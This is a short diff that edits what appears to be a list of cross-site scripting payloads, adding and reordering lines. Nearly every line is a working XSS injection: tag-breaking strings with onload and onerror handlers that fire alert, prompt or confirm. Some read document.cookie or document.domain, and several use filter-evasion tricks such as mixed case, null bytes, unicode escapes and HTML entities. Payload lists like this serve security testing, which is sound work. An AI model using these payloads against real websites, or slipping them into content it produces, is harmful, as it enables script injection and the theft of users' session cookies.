@@ -1,4 +1,6 @@
 <Svg On Only=1 Onload=alert(1)>
+xyz';"/></textarea><Img Src=OnXSS OnError=prompt(document.cookie)>
+"><body/onload="{x:onerror=alert};x"
 10</option></select><img/src=xon=()onx+honerror=alert(1)>ss<svg/onload=prompt(document.domain)%20>
 <script type="text/javascript">javascript:alert(1);</script>
 <svg/onload=alert&sol;**&sol;(3)>
@@ -10,7 +12,6 @@ page=1"><Svg Only=1 OnLoad=confirm(document.domain)>
 <img/src=xon=()onx+honerror=alert(1)>ss<svg/onload=prompt(document.domain)%20>
 <svg/onload=prompt()>
 "><Svg Only=1 OnLoad=confirm(document.domain)>
-xyz';"/></textarea><Img Src=OnXSS OnError=prompt(document.cookie)>
 “><img only src=1 onerror=alert()>
 <sVg %00%00%00//onsite ONloAd=\u0061\u006C\u0065\u0072\u0074`/AmoloHT/`//>
 "><body/onload="{x:onerror=alert};x"
